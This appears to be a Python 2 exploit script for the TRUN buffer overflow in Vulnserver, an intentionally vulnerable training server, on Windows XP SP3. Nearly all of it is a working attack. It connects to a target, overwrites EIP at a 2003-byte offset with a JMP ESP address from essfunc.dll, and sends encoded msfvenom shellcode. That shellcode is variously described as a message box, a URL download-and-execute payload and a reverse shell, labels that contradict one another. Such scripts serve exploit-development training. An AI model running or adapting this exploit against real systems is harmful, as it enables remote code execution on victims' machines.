# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Steve Bradshaw's Vulnserver TRUN - with custom msgbox shellcode
# Windows XP SP3
# 21/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

# echo -ne URLDownload-Exec shellcode | msfvenom -p- --platform windows -a x86 -f c -b "\x00\x20" -e x86/shikata_ga_nai
shell = ("\xb8\xbc\xfd\x74\x47\xda\xca\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x37\x31\x43\x15\x83\xc3\x04\x03\x43\x11\xe2\x49\xcc\xb4\x76"
"\x6a\x1e\xfc\x92\xd9\x38\xcf\xb6\x69\xeb\x25\x8c\x12\x11\xba"
"\x8e\xb5\xd6\x69\x85\x60\x70\xbf\x88\x02\xd3\xad\x7d\x42\x6f"
"\xe1\xd3\xe2\xf3\xfd\xff\x09\x57\x59\x31\x1f\xe0\x0e\x2a\x74"
"\x84\xe9\x7d\x58\xef\x5b\x78\x6d\x22\x09\xd6\xdc\x91\xfc\x29"
"\x0e\xfe\x71\x8d\x9f\xd3\xfa\x62\xfc\xe2\x3a\xd4\x51\xbc\x16"
"\xf6\xd3\xc2\x97\x28\xea\xfa\x38\x70\xf6\x31\x39\xfa\xf9\x15"
"\xd2\xa5\xfa\x65\xdc\xdf\x76\xf6\x4e\x4f\x18\x28\xf5\xe3\x88"
"\x7a\x1d\x5d\xaf\x7c\x22\xf7\x1d\xcf\x99\x97\xd6\xa1\x4d\x07"
"\x79\x5a\xda\xb8\x3f\xcb\x8e\x23\xfe\x45\xa7\x33\xff\xa5\xc8"
"\x24\x8b\x2d\x47\x8f\x5c\xe1\x96\xd6\x90\xd3\xe9\x1e\xec\x05"
"\x39\x71\x3d\x69\x0d\xa2\x53\xee\x43\xd9\xd3\x95\xd5\xc9\xa5"
"\xa9\x15\xf6\xc7\x36\xc4\x6c\x6f\xdc\x56\x87\x04\xe1\x98\xa8"
"\x74\x7d\x49\x32\xf0\xe4\xb5\x8d\x39\xd5\x9b\xdc\x0f\x21\xca"
"\x2d\x41\x60\x21\x62\xbd\xb6\x71\xb1\x9d\x9b\x1c\x95\xbe\x8e"
"\xba\xfb\x25\x29\x26\x4a")

payload = "TRUN /.:/"

# EIP Overwrite at 2003
payload += "A"*2003

# essfunc.dll
# 625011AF
ret = 0x625011AF

payload += p(ret)

# Sits on stack and ESP points directly to the beginning of this chunk
#payload += "C"*300
payload += "\x90"*16 + shell

print "Sending UB3R Payl0ad :D"
sock.send(payload)
print "One Reverse Shell Coming Right Up..."
"""
while True:
	inp = raw_input()
	sock.send(str(inp))
	dat = sock.recv(1024)
	print dat
"""
